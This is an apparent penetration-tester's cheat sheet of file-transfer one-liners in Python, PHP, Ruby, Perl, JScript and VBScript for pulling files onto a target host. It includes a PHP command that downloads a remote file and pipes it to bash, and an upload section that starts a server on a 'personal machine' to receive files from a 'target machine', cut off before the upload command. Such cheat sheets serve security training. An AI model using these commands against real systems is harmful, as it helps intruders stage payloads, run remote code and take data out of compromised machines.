## Download Operations
#### 1) Python
- **Python 2 - Download**
	- `python2.7 -c 'import urllib; urllib.urlretrieve("[file link]", "[File path]")'`
- **Python 3 - Download**
	- `python3 -c 'import urllib.request; urllib.request.urlretrieve("[file link]", "[file path]")'`
****
#### 2) PHP
- **PHP Download with File_get_contents()**
	- `php -r '$file = file_get_contents("[file link]"); file_put_contents("[file path]", $file)'`
- **PHP Download with Fopen()**
	- `php -r 'const BUFFER = 1024; $fremote = fopen("[file link]", "rb"); $flocal = fopen("[file path]", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);`
- **PHP Download a File and Pipe it to Bash**
	- `php -r '$lines = @file("[file link]"); foreach ($lines as $line_num => $line) {echo $line; } | bash'`
****
#### 3) Ruby
- **Ruby Download a File**
	- `ruby -e 'require "net/http"; File.write("[file path]", Net::HTTP.get(URI.parse("[file link]")))'`
****
#### 4) Perl
- **Perl Download a File**
	- `perl -e 'use LWP::Simple; getstore("[file link]", "[file path]");`
****
#### 5) JavaScript
1. **Create wget.js**
	- First create a wget.js file with following content:
```JavaScript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
2. **Download a File Using JavaScript and cscript.exe**
	- `cscript.exe /nologo wget.js [file link] [file path]`
****
#### 6) VBScript
- **Microsoft Visual Basic Scripting Edition**: Installed by default in every desktop release of Microsoft Windows since Windows 98
1. **Create wget.vbs**
	- First create a wget.vbs file with following content:
```VBScript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
2. **Download a File Using VBScript and cscript.exe**
	- `cscript.exe /nologo wget.vbs [file link] [file address]`

## Upload Operations
#### Using Python
1. **Personal Machine - Start the Python uploadserver Module**
	- `python3 -m uploadserver`
2. **Target Machine - Uploading a File Using a Python One-liner**
